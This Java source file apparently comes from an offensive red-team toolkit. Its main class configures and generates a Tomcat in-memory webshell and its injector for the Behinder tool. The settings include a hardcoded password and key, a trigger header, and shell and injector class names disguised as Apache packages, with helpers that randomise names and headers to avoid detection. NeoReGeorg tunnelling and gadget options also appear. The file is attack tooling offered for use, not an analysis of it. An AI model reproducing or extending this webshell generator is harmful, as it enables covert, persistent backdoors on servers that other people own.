package com.potato.potatotool.content.redTeam.memshell;

import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.util.ClassNameUtil;
import com.potato.potatotool.content.redTeam.memshell.util.RandomHeaderUtil;
import com.potato.potatotool.utils.data.StrUtils;

import java.util.Map;

import static com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants.*;

/**
 * @author Potato
 * @date 2024/7/29 15:43
 */
public class GenerateMemoryShell {

    public static void main(String[] args) throws Exception {
        MemoryObj memoryObj = initMemoryObj(TOOL_BEHINDER, SERVER_TOMCAT, SHELLTYPE_LISTENER, OUTPUTFORMAT_BASE64, "123456", "123456", "Referer", "Qatx", "org.apache.logging.ContextLoaderHrListener", "org.apache.commons.e.NetworkUtils", "/*", null, null);

        memoryObj.buildMemoryShellAndInjector();

        Map<String, String> showResultMap = memoryObj.getShowResultMap();

        System.out.println(showResultMap);
    }

    private static MemoryObj initMemoryObj(String toolType, String serverType, String shellType, String outputFormat, String pass, String key, String headerName, String headerValue, String shellClassName, String injectorClassName, String urlPattern, String gadgetType, String exprEncoder) {
        MemoryObj memoryObj = new MemoryObj();

        memoryObj.setToolType(toolType);
        memoryObj.setServerType(serverType);
        memoryObj.setShellType(shellType);
        memoryObj.setOutputFormat(outputFormat);

        memoryObj.setPass(pass);
        memoryObj.setKey(key);
        memoryObj.setHeaderName(headerName);
        memoryObj.setHeaderValue(headerValue);
        memoryObj.setShellClassName(shellClassName);
        memoryObj.setInjectorClassName(injectorClassName);
        memoryObj.setUrlPattern(urlPattern);

        if(gadgetType==null || gadgetType.equals("无") || gadgetType.equals("")){
            memoryObj.setGadgetType(null);
        }else {
            memoryObj.setGadgetType(gadgetType);
        }
        if(exprEncoder==null || exprEncoder.equals("无") || exprEncoder.equals("")){
            memoryObj.setExprEncoder(null);
        }else {
            memoryObj.setExprEncoder(exprEncoder);
        }

        if (memoryObj.getPass() == null || memoryObj.getPass().equals("")) memoryObj.setPass(StrUtils.generateRandomString(6, 10));
        if (memoryObj.getKey() == null || memoryObj.getKey().equals("")) memoryObj.setKey(StrUtils.generateRandomString(6, 10));
        if (memoryObj.getToolType().equals(TOOL_NEOREGEORG)) memoryObj.setKey("key");
        if (memoryObj.getShellClassName() == null || memoryObj.getShellClassName().equals("")) memoryObj.setShellClassName(ClassNameUtil.getRandomShellClassName(memoryObj.getShellType()));
        if (memoryObj.getInjectorClassName() == null || memoryObj.getInjectorClassName().equals("")) memoryObj.setInjectorClassName(ClassNameUtil.getRandomInjectorClassName());
        Map.Entry<String, String> header = RandomHeaderUtil.generateRandomHeader();
        if (memoryObj.getHeaderName() == null || memoryObj.getHeaderName().equals("")) memoryObj.setHeaderName(header.getKey());
        if (memoryObj.getHeaderValue() == null || memoryObj.getHeaderValue().equals("")) memoryObj.setHeaderValue(header.getValue());
        if (memoryObj.getUrlPattern() == null || memoryObj.getUrlPattern().equals("") || memoryObj.getUrlPattern().equals("/*") || memoryObj.getUrlPattern().equals("/")) {
            if (memoryObj.getShellType().equals(SHELLTYPE_WFHANDLERMETHOD)) {
                memoryObj.setUrlPattern("/" + StrUtils.generateRandomString(6, 6).toLowerCase());
            } else {
                memoryObj.setUrlPattern("/*");
            }
        }
        if (memoryObj.getOutputFormat().contains(OUTPUTFORMAT_BCEL)) memoryObj.setLoaderClassName(ClassNameUtil.getRandomLoaderClassName());
        memoryObj.setInjectorSimpleClassName(getSimpleName(memoryObj.getInjectorClassName()));

        return memoryObj;
    }

    // 获取类名的简单名称（去掉包路径）
    public static String getSimpleName(String className) {
        int lastDotIndex = className.lastIndexOf(".");
        if (lastDotIndex != -1 && lastDotIndex < className.length() - 1) {
            return className.substring(lastDotIndex + 1);
        }
        return className;
    }
}
